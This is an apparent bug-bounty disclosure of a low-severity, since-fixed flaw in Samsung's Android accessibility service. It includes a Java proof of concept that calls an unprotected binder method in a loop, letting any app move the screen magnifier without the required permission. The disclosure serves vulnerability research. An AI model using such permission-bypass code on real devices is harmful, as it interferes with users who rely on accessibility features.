# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/services.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.30</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.09.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$480</td>
    </tr>
</table>

# Description

The system service `accessibility` (`android.view.accessibility.IAccessibilityManager`) was created in AOSP but then extended in the Samsung Android Framework. It contained a method `com.android.server.accessibility.AccessibilityManagerService.semMoveAMMagnification()` which was not protected in any way:
```java
@Override
public void semMoveAMMagnification(float offsetX, float offsetY) {
    getWindowMagnificationMgr().moveWindowMagnification(0, offsetX, offsetY);
}
```

The attacker could change magnefier's position. Such actions usually require the permission `android.permission.MANAGE_ACCESSIBILITY`.

**Proof of Concept**

To make the code work, the user must have the magnifier enabled.

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = (IBinder) Class.forName("android.os.ServiceManager")
                .getMethod("getService", String.class)
                .invoke(null, "accessibility");

        new Thread(() -> moveMagnifier(binder)).start();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private void moveMagnifier(IBinder binder) {
    try {
        while (true) {
            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken("android.view.accessibility.IAccessibilityManager");
            parcel.writeFloat(1);
            parcel.writeFloat(1);

            Parcel reply = Parcel.obtain();

            binder.transact(62, parcel, reply, 0);
            reply.readException();

            Thread.sleep(10);
        }
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
